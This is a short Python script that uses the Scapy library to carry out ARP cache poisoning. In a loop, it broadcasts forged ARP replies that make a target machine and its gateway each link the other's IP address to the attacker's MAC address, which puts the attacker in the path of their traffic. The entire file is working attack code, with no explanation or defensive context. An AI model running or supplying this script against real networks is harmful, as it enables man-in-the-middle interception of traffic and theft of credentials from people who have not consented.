from scapy.all import ARP, Ether, sendp, get_if_hwaddr
import time

def arp_poison(target_ip, gateway_ip, interface):
    mac = get_if_hwaddr(interface)

    # Create an ARP response packet for the target machine
    arp_response_target = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=mac)
    
    # Create an ARP response packet for the gateway machine
    arp_response_gateway = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=mac)

    # Continually send the ARP response packets
    while True:
        try:
            sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/arp_response_target, iface=interface, verbose=False)
            sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/arp_response_gateway, iface=interface, verbose=False)
            time.sleep(5)
        except KeyboardInterrupt:
            break

